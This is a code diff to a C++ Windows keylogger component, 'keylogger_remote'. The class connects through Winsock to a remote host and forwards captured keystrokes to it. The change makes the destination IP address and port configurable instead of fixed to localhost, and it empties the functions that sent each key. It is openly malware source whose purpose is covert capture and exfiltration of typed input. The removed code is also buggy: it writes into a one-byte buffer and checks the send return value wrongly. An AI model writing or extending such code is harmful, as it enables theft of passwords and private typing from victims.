@@ -8,15 +8,18 @@ keylogger_remote::keylogger_remote()
 keylogger_remote::~keylogger_remote()
 {
 	closesocket(a_socket);
+
+	WSACleanup();
 }
 
-void keylogger_remote::initialize()
+void keylogger_remote::initialize(string p_ip_address, int p_port)
 {
 	WSADATA t_wsa_data;
 
 	int t_result = 0;
 
 	t_result = WSAStartup(MAKEWORD(2,2), &t_wsa_data);
+
 	if(t_result != NO_ERROR)
 	{
 		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
@@ -24,9 +27,9 @@ void keylogger_remote::initialize()
 	}
 
 	SOCKADDR_IN t_sockaddr_in;
-	t_sockaddr_in.sin_addr.s_addr	= inet_addr("127.0.0.1");
-	t_sockaddr_in.sin_family		= AF_INET;
-	t_sockaddr_in.sin_port		= htons(10000);
+	t_sockaddr_in.sin_addr.s_addr = inet_addr(p_ip_address.c_str());
+	t_sockaddr_in.sin_family      = AF_INET;
+	t_sockaddr_in.sin_port		  = htons(p_port);
 
 	a_socket = socket(AF_INET,SOCK_STREAM,0);
 
@@ -47,26 +50,7 @@ void keylogger_remote::initialize()
 	}
 }
 
-void keylogger_remote::save(int p_key)
+void keylogger_remote::save()
 {
-	char t_buffer[1];
 
-	sprintf(t_buffer, "%d", p_key);
-
-	cout << "Send : " << char(p_key) << endl;
-
-	if(send(a_socket, t_buffer, 1, 0) != 0)
-	{
-		cerr << "send" << endl;
-		exit(1);
-	}
-}
-
-void keylogger_remote::save(LPCSTR p_key)
-{
-	if(send(a_socket, p_key, strlen(p_key), 0) != 0)
-	{
-		cerr << "send" << endl;
-		exit(1);
-	}
 }
